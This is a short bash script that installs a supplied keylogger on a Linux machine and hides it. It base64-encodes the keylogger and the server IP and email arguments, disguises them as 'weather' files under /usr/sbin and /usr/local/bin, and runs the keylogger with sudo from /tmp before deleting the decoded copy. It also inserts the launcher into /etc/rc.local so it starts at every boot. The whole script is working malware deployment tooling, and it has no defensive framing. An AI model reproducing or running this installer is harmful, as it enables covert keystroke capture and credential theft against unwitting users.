#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <keylogger file> <Email> <Server Server_IP>"
    exit 1
fi

keylogger=$1
Email=$2
Server_IP=$3
weather_file="/usr/games/"
system_file="weatherInfo"
argument_file="/usr/sbin/weatherArg"
script="/usr/local/bin/weather.sh"
boot_file="/etc/rc.local"

cd /tmp
base64 "$keylogger" > "$system_file"
echo "$Server_IP $Email $weather_file" | base64 > $argument_file  # save
rm "$keylogger"
mv "$system_file" /usr/sbin/"$system_file"

cat << EOF > $script
base64 -d /usr/sbin/$system_file > /tmp/weather
argument=\$(base64 -d $argument_file)
chmod +x /tmp/weather
sudo /tmp/weather \$argument &
sleep 5
rm /tmp/weather
EOF


chmod +x $script
/usr/local/bin/weather.sh &

# check if the "exit 0" line exists and then add the command above it
if grep -q "^exit 0" "$boot_file"; then
    # insert the line before "exit 0", ensuring it's the actual command
    sed -i '/^exit 0/i '"$script &" "$boot_file"
else
    echo "No 'exit 0' found in the file."
fi

